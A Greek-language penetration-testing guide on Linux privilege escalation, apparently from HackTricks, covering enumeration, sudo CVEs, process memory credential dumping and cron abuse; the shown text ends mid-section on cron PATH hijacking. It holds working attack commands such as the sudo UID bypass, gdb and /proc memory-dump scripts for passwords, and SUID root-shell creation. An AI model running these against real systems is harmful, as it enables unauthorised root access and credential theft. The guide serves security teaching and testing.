# Κλιμάκωση προνομίων Linux

{{#include ../../../banners/hacktricks-training.md}}

Για ευρύτερο υπόβαθρο και ιστορικές ροές εργασίας enumeration, συγκρίνετε τους πόρους g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation και linux-private-i που παρατίθενται στις αναφορές.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Πληροφορίες συστήματος

### Πληροφορίες OS

Ας αρχίσουμε να συλλέγουμε πληροφορίες για το OS που εκτελείται.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Διαδρομή

Αν έχετε **δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή PATH**, ίσως μπορέσετε να κάνετε hijack ορισμένες βιβλιοθήκες ή binaries:

```bash
echo $PATH
```

### Πληροφορίες περιβάλλοντος

Υπάρχουν ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για κλιμάκωση προνομίων.

Η [ενότητα Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) συγκεντρώνει περιπτώσεις τοπικής κλιμάκωσης προνομίων και συνδέσμους προς πιο αναλυτικές παρουσιάσεις του Linux kernel στην ενότητα Binary Exploitation. Επαληθεύστε την επηρεαζόμενη έκδοση και διαμόρφωση πριν δοκιμάσετε κάποια μελέτη περίπτωσης.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Μπορείτε να βρείτε μια καλή λίστα ευάλωτων kernel και μερικά **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις kernel από αυτόν τον ιστότοπο, μπορείτε να εκτελέσετε:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το στο victim· ελέγχει για exploits μόνο για kernel 2.x)

Να **αναζητάτε πάντα την έκδοση του kernel στο Google**· μπορεί η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit, οπότε θα είστε σίγουροι ότι το exploit είναι έγκυρο.

Πρόσθετες τεχνικές εκμετάλλευσης του kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Κλιμάκωση προνομίων Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Έκδοση του Sudo

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:

```bash
searchsploit sudo
```

Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Το upstream sudo **1.9.14 έως 1.9.17** επιτρέπει σε μη προνομιούχους τοπικούς χρήστες να αποκτήσουν δικαιώματα root μέσω της επιλογής `--chroot`, όταν το sudo φορτώνει το `/etc/nsswitch.conf` από κατάλογο που ελέγχεται από τον χρήστη· το upstream διόρθωσε το πρόβλημα στην **1.9.17p1**. Ελέγξτε κάθε εκτελέσιμο root-setuid sudo binary στις σχετικές διαδρομές, καθώς το `sudo -V` αναφέρει μόνο το binary που επιλέγεται από το `PATH`. Τα πακέτα διανομών ενδέχεται να έχουν ενσωματώσει τη διόρθωση χωρίς να αλλάξουν τη συμβολοσειρά έκδοσης upstream, επομένως ελέγξτε επίσης την κατάσταση του πακέτου του προμηθευτή. Δείτε τη [συμβουλευτική ανακοίνωση του συντηρητή του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ακολουθεί ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για την εκμετάλλευση αυτής της [ευπάθειας](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι ευάλωτη και ότι υποστηρίζει τη λειτουργία `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στην αρχική [συμβουλευτική ανακοίνωση ευπάθειας](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Παράκαμψη κανόνων sudo βάσει hostname (CVE-2025-32462)

Το upstream sudo **1.8.8 έως 1.9.17** μπορεί να αξιολογήσει κανόνες sudoers βάσει hostname χρησιμοποιώντας το **hostname που παρέχει ο χρήστης** μέσω του `sudo -h <host>` αντί για το **πραγματικό hostname**· το upstream διόρθωσε το πρόβλημα στην **1.9.17p1**. Ο χρήστης πρέπει και πάλι να έχει αντίστοιχη καταχώριση sudoers στον επιλεγμένο host. Ελέγξτε τις διορθώσεις που έχουν ενσωματώσει οι προμηθευτές και τα εναλλακτικά sudo binaries, καθώς και την τοπική πολιτική. Δείτε τη [συμβουλευτική ανακοίνωση του συντηρητή του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Απαιτήσεις:
- Ευάλωτη έκδοση sudo
- Κανόνες sudoers που αφορούν συγκεκριμένο host (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)

Παράδειγμα μοτίβου sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit μέσω spoofing του επιτρεπόμενου host:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Αν η επίλυση του επιλεγμένου ονόματος αποτύχει, επαλήθευσε πώς επιλύεται αυτό το όνομα στον host. Το ότι εμφανίζεται ένα όνομα σε αρχείο καταγραφής ή ρυθμίσεων δεν σημαίνει ότι μπορεί να επιλυθεί, ενώ η τροποποίηση του `/etc/hosts` συνήθως απαιτεί προνομιακή πρόσβαση εγγραφής.

#### sudo < v1.8.28

Αυτό το [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) απαιτεί έναν ενεργό κανόνα sudo που επιτρέπει την εκτέλεση μιας εντολής ως χρήστης `ALL`, εξαιρώντας παράλληλα τον root, όπως το `(ALL, !root) /bin/bash`. Ο χρήστης που καλεί την εντολή πρέπει επίσης να έχει δικαίωμα χρήσης αυτού του κανόνα, συμπεριλαμβανομένης τυχόν απαίτησης ελέγχου ταυτότητας. Έλεγξε την ανακοίνωση ασφαλείας του εγκατεστημένου πακέτου: οι προμηθευτές ενσωμάτωσαν τη διόρθωση σε εκδόσεις των οποίων η εμφανιζόμενη upstream έκδοση παραμένει κάτω από την 1.8.28. Ένας κανόνας `!root` ή μια παλιά έκδοση από μόνη της δεν επιβεβαιώνει ότι το σύστημα είναι ευάλωτο. Μην δοκιμάζεις μια προνομιακή εντολή κατά την παθητική απαρίθμηση.

```
sudo -u#-1 /bin/bash
```

### Αποτυχία επαλήθευσης υπογραφής Dmesg

Ελέγξτε το **smasher2 box of HTB** για ένα **παράδειγμα** του τρόπου με τον οποίο θα μπορούσε να γίνει exploit αυτή η ευπάθεια.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Περισσότερη απαρίθμηση συστήματος

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Καταγράψτε πιθανές άμυνες

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Αν βρίσκεστε μέσα σε container, ξεκινήστε από την παρακάτω ενότητα για την ασφάλεια των container και έπειτα περάστε στις σελίδες κατάχρησης που αφορούν συγκεκριμένα runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι προσαρτημένο και τι όχι**, πού και γιατί. Αν κάτι δεν είναι προσαρτημένο, μπορείτε να δοκιμάσετε να το προσαρτήσετε και να ελέγξετε αν περιέχει ιδιωτικές πληροφορίες.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Χρήσιμο λογισμικό

Απαριθμήστε χρήσιμα binaries

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Επίσης, ελέγξτε αν **είναι εγκατεστημένος κάποιος μεταγλωττιστής**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσετε (ή σε κάποιο παρόμοιο).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα), η οποία θα μπορούσε να γίνει αντικείμενο εκμετάλλευσης για privilege escalation…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Αν έχεις SSH πρόσβαση στο μηχάνημα, μπορείς επίσης να χρησιμοποιήσεις το **openVAS** για να ελέγξεις αν υπάρχουν παρωχημένα και ευάλωτα προγράμματα εγκατεστημένα στο μηχάνημα.

> [!NOTE] > _Σημείωσε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες, οι περισσότερες από τις οποίες θα είναι άχρηστες. Γι’ αυτό, συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων, που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits._

## Processes

Ρίξε μια ματιά στο **ποια processes** εκτελούνται και έλεγξε αν κάποιο process έχει **περισσότερα προνόμια απ’ όσα θα έπρεπε** (μήπως εκτελείται το tomcat από τον root;)

```bash
ps aux
ps -ef
top -n 1
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τους εκμεταλλευτείτε για κλιμάκωση προνομίων. Το **Linpeas** τους εντοπίζει ελέγχοντας για την παράμετρο `--inspect` στη γραμμή εντολών της διεργασίας.\
Επίσης, **ελέγξτε τα δικαιώματά σας στα δυαδικά αρχεία των διεργασιών**· ίσως μπορείτε να αντικαταστήσετε κάποιο.

### Αλυσίδες γονικών-θυγατρικών διεργασιών μεταξύ χρηστών

Μια θυγατρική διεργασία που εκτελείται με **διαφορετικό χρήστη** από τη γονική της δεν είναι αυτομάτως κακόβουλη, αλλά αποτελεί χρήσιμο **σήμα για triage**. Ορισμένες μεταβάσεις είναι αναμενόμενες (`root` που εκκινεί μια υπηρεσία με χρήστη υπηρεσίας, διαχειριστές σύνδεσης που δημιουργούν διεργασίες συνεδρίας), αλλά ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, βοηθητικά εργαλεία αποσφαλμάτωσης, persistence ή αδύναμα όρια εμπιστοσύνης κατά τον χρόνο εκτέλεσης.

Γρήγορος έλεγχος:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Αν βρείτε μια απρόσμενη αλυσίδα, ελέγξτε τη γραμμή εντολών του γονικού process και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά του (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Σε αρκετές πραγματικές διαδρομές privesc, το ίδιο το child δεν ήταν writable, αλλά ήταν το **config που ελεγχόταν από το parent** ή η αλυσίδα των helper.

### Διαγραμμένα executables και αρχεία που έχουν διαγραφεί ενώ παραμένουν ανοιχτά

Τα runtime artifacts είναι συχνά ακόμη προσβάσιμα **μετά τη διαγραφή τους**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση αποδεικτικών στοιχείων από μια διεργασία που έχει ήδη ανοιχτά ευαίσθητα αρχεία.

Ελέγξτε για διαγραμμένα executables:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Αν το `/proc/<PID>/exe` δείχνει στο `(deleted)`, η διεργασία εξακολουθεί να εκτελεί την παλιά εικόνα του δυαδικού αρχείου από τη μνήμη. Αυτό είναι ισχυρή ένδειξη ότι πρέπει να το διερευνήσετε, επειδή:

- το αφαιρεθέν εκτελέσιμο μπορεί να περιέχει ενδιαφέρουσες συμβολοσειρές ή διαπιστευτήρια
- η διεργασία που εκτελείται ενδέχεται να εξακολουθεί να εκθέτει χρήσιμους file descriptors
- ένα διαγραμμένο προνομιούχο δυαδικό αρχείο μπορεί να υποδηλώνει πρόσφατη αλλοίωση ή απόπειρα εκκαθάρισης

Συλλέξτε καθολικά τα διαγραμμένα αρχεία που παραμένουν ανοιχτά:

```bash
lsof +L1
```

Αν εντοπίσετε έναν ενδιαφέροντα περιγραφέα, ανακτήστε τον απευθείας:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία έχει ακόμη ανοιχτό ένα διαγραμμένο μυστικό, script, εξαγωγή βάσης δεδομένων ή αρχείο flag.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διεργασίες. Αυτό μπορεί να βοηθήσει πολύ στον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή εκτελούνται όταν πληρούνται συγκεκριμένες προϋποθέσεις.

#### Linux ProcMon με sudo

Το [ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) μπορεί να καταγράφει επιλεγμένες διεργασίες και κλήσεις συστήματος και να αποθηκεύει την καταγραφή σε SQLite. Αν το `sudo -l` επιτρέπει την εκτέλεση μιας εντολής `procmon` με δυνατότητα πρόσβασης root χωρίς περιορισμούς, εξετάστε αν θα μπορούσε να παρακολουθεί την είσοδο ή την έξοδο της διεργασίας κάποιου άλλου χρήστη. Η άδεια αυτή είναι απλώς ένα στοιχείο προς διερεύνηση: σημαντικά είναι επίσης η υποστήριξη του tracer, η ισχύουσα πολιτική και η δραστηριότητα μιας κατάλληλης διεργασίας. Τα αρχεία καταγραφής μπορεί να περιέχουν μυστικά, γι' αυτό εξετάζετε προσεκτικά τις εξουσιοδοτημένες εξαγωγές και αποφεύγετε τη συλλογή δεδομένων από άσχετες διεργασίες.

### Μνήμη διεργασιών

Ορισμένες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο μέσα στη μνήμη**.\
Κανονικά θα χρειαστείτε **προνόμια root** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες. Επομένως, αυτό είναι συνήθως πιο χρήσιμο όταν έχετε ήδη πρόσβαση root και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, να θυμάστε ότι **ως απλός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι σήμερα τα περισσότερα μηχανήματα **δεν επιτρέπουν το ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον μη προνομιούχο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την πρόσβαση στο ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: μπορούν να γίνουν debug όλες οι διεργασίες, αρκεί να έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος λειτουργίας του ptrace.
> - **kernel.yama.ptrace_scope = 1**: μπορεί να γίνει debug μόνο σε διεργασία-γονέα.
> - **kernel.yama.ptrace_scope = 2**: μόνο ο διαχειριστής μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: δεν επιτρέπεται η παρακολούθηση καμίας διεργασίας με ptrace. Μόλις οριστεί αυτή η τιμή, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptrace.

Μια διεργασία με το ίδιο UID, η οποία ξεκλειδώνει προσωρινά ένα password vault, μπορεί να αποτελεί ξεχωριστό όριο ασφαλείας για τα διαπιστευτήρια. Όταν επιτρέπεται το tracing, μια ενεργή διεργασία που επιτρέπει τη δημιουργία dump μπορεί να εκθέσει τον κωδικό πρόσβασης του vault μέσω των κλήσεων συστήματος εισόδου ή της μνήμης της, παρόλο που το κρυπτογραφημένο αρχείο του vault παραμένει προστατευμένο. Το `ptrace_scope=0` είναι μόνο μία από τις απαραίτητες προϋποθέσεις: σημαντικά είναι επίσης τα αντίστοιχα διαπιστευτήρια, η δυνατότητα δημιουργίας dump από τη διεργασία-στόχο, άλλες μονάδες ασφαλείας του Linux και η διάρκεια ζωής της διεργασίας. Για να χρησιμοποιηθεί μια καταχώριση του vault ως σύνδεση Unix root, απαιτείται ξεχωριστός έλεγχος επαναχρησιμοποίησης διαπιστευτηρίων. Η συνήθης απαρίθμηση θα πρέπει να αναφέρει την πολιτική και την υποψήφια διεργασία ή τις διαδρομές των vault, χωρίς να καταγράφει είσοδο ή να εμφανίζει μυστικά. Δείτε την [τεκμηρίωση Yama του kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) και τους [ελέγχους πρόσβασης ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP, για παράδειγμα, θα μπορούσατε να ανακτήσετε το Heap και να αναζητήσετε εκεί τα διαπιστευτήριά της.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Σενάριο GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο αναγνωριστικό διεργασίας, **το maps δείχνει πώς χαρτογραφείται η μνήμη μέσα στη διεργασία** στον εικονικό χώρο διευθύνσεών της· δείχνει επίσης **τα δικαιώματα κάθε χαρτογραφημένης περιοχής**. Το ψευδοαρχείο **mem** **εκθέτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να κάνουμε **seek στο αρχείο mem και να αποθηκεύσουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο χώρος εικονικών διευθύνσεων του kernel είναι προσβάσιμος μέσω του `/dev/kmem`.\
Συνήθως, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump για Linux

Το ProcDump είναι μια ανασχεδιασμένη εκδοχή για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Αποκτήστε το από [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας, μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις για root και να κάνετε dump τη διεργασία που σας ανήκει
- Script A.5 από το [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν διαπιστώσετε ότι εκτελείται η διεργασία authenticator:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Μπορείτε να κάνετε dump τη διεργασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους για να κάνετε dump τη μνήμη μιας διεργασίας) και να αναζητήσετε credentials στη μνήμη:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **υποκλέψει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Για να λειτουργήσει σωστά, απαιτεί δικαιώματα root.

| Δυνατότητα                                       | Όνομα διεργασίας    |
| ------------------------------------------------- | -------------------- |
| Κωδικός πρόσβασης GDM (Kali Desktop, Debian Desktop) | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (ενεργές συνδέσεις FTP)                    | vsftpd               |
| Apache2 (ενεργές συνεδρίες HTTP Basic Auth)       | apache2              |
| OpenSSH (ενεργές συνεδρίες SSH - χρήση Sudo)      | sshd:                |

#### Regex αναζήτησης/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Προγραμματισμένες εργασίες/Cron

### Crontab UI (alseambusher) που εκτελείται ως root – privesc μέσω web-based scheduler

Αν ένα web panel “Crontab UI” (alseambusher/crontab-ui) εκτελείται ως root και είναι δεσμευμένο μόνο στο loopback, μπορείτε και πάλι να αποκτήσετε πρόσβαση μέσω SSH local port-forwarding και να δημιουργήσετε μια privileged job για να κλιμακώσετε τα προνόμιά σας.<sup>[[1]](#references)[[4]](#references)</sup>

Τυπική αλυσίδα
- Εντοπίστε port που είναι προσβάσιμο μόνο μέσω loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
  - Backups/scripts με `zip -P <password>`
  - systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Δημιουργήστε tunnel και συνδεθείτε:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιουργήστε ένα job υψηλών προνομίων και εκτελέστε το αμέσως (εγκαθιστά SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```

Θωράκιση
- Μην εκτελείτε το Crontab UI ως root· περιορίστε το με αποκλειστικό χρήστη και ελάχιστα δικαιώματα
- Κάντε bind στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε passwords
- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή EnvironmentFile με πρόσβαση μόνο από root
- Ενεργοποιήστε audit/logging για την εκτέλεση εργασιών κατ’ απαίτηση

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (ευπάθεια wildcard; να τροποποιήσετε αρχεία που χρησιμοποιεί το root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί το root;).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Αν χρησιμοποιείται το `run-parts`, ελέγξτε ποια ονόματα θα εκτελεστούν πραγματικά:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Αυτό αποτρέπει τα false positives. Ένας εγγράψιμος περιοδικός κατάλογος είναι χρήσιμος μόνο αν το όνομα του payload σου συμμορφώνεται με τους τοπικούς κανόνες του `run-parts`.

### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείς να βρεις το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημείωσε ότι ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει τη διαδρομή. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείς να αποκτήσεις ένα root shell χρησιμοποιώντας:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
